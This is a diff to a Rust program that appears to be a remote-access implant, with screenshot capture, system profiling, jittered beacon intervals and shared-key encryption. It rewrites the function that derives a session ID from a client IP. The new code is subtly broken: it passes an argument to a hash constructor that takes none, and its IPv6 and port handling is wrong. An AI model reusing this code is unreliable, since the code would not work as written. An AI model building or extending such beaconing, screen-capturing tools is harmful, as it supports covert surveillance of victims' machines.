@@ -16,7 +16,7 @@ use base64::Engine;
 use ::image::EncodableLayout;
 use sha2::digest::generic_array::GenericArray;
 use sysinfo::{System, SystemExt};
-use rand::{Rng, RngCore};
+use rand::{CryptoRng, Rng, RngCore};
 use screenshots::{Screen, image};
 use chrono::{Local, Datelike, Timelike};
 use sha2::{Sha256, Digest, Sha512};
@@ -41,6 +41,7 @@ const RETRY_INTERVALS: [u64; 6] = [
 ];
 const BEACON_MIN_INTERVAL: u64 = 5 * 60 * 1000; // 5 minutes
 const BEACON_MAX_INTERVAL: u64 = 45 * 60 * 1000; // 45 minutes
+const SESSION_ID_LENGTH: usize = 32;
 
 // Global variables (using Arc<Mutex<>> for shared mutable state)
 static LOGGING: bool = true; // Set this to true or false as needed
@@ -63,23 +64,35 @@ fn log_it(message: &str) {
     }
 }
 
-fn get_session_id(client: &TcpStream) -> Result<String, Box<dyn Error>> {
-    let peer_addr: std::net::SocketAddr = client.peer_addr()?;
-    let ip_address: String = peer_addr.ip().to_string();
-    log_it(&format!("IP Address: {}", ip_address));
-    
-    let sum: u32 = ip_address
-        .split('.')
-        .map(|octet: &str| octet.parse::<u32>().unwrap_or(0))
-        .sum();
-    
-    let mut hasher = Sha256::new();
-    hasher.update(format!("{}<>{}", ip_address, sum));
-    let result = hasher.finalize();
-    let crypt: String = hex::encode(&result)[..32].to_string();
-    
-    log_it(&format!("Session ID: {}", crypt));
-    Ok(crypt)
+fn get_session_id(ip_address: &str) -> Result<String, Box<dyn Error>> {
+    if ip_address.is_empty() {
+        log_it("Invalid input provided");
+        return Err("Invalid input provided".into());
+    }
+
+    // Remove port if present and handle IPv6 localhost
+    let ip_copy: String = ip_address.split(':').next()
+        .ok_or("Invalid IP format")?
+        .replace("::1", "127.0.0.1");
+
+    // Parse IP and calculate sum
+    let sum: u32 = match ip_copy.parse::<IpAddr>()? {
+        IpAddr::V4(ip) => ip.octets().iter().map(|&x| x as u32).sum(),
+        IpAddr::V6(_) => 0,  // We don't sum IPv6 addresses
+    };
+
+    // Prepare hash input
+    let hash_input: String = format!("{}<>{}", ip_address, sum);
+
+    // Compute SHA256 hash with key
+    let mut hasher = Sha256::new(hash_input.as_bytes());
+    let hash = hasher.finalize();
+
+    // Convert hash to hex and truncate to SESSION_ID_LENGTH characters
+    let session_id: String = hex::encode(&hash[..SESSION_ID_LENGTH / 2]);
+
+    log_it(&format!("Session ID: {}", session_id));
+    Ok(session_id)
 }
 
 fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn Error>> {
